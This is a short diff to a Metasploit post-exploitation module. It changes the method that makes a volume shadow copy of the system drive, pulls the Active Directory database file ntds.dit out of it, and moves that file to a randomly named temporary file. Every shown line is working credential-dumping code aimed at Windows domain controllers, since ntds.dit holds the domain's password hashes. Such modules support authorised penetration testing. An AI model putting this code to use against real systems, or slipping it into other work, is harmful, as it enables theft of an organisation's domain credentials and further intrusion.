@@ -141,10 +141,12 @@ class Metasploit3 < Msf::Post
   end
 
   def vss_method
-    id = create_shadowcopy("#{get_env("%SystemDrive%")}\\")
+    location = ntds_location.dup
+    volume = location.slice!(0,3)
+    id = create_shadowcopy("#{volume}\\")
     print_status "Getting Details of ShadowCopy #{id}"
     sc_details = get_sc_details(id)
-    sc_path = "#{sc_details['DeviceObject']}\\windows\\ntds\\ntds.dit"
+    sc_path = "#{sc_details['DeviceObject']}\\#{location}\\ntds.dit"
     target_path = "#{get_env("%WINDIR%")}\\Temp\\#{Rex::Text.rand_text_alpha((rand(8)+6))}"
     print_status "Moving ntds.dit to #{target_path}"
     move_file(sc_path, target_path)
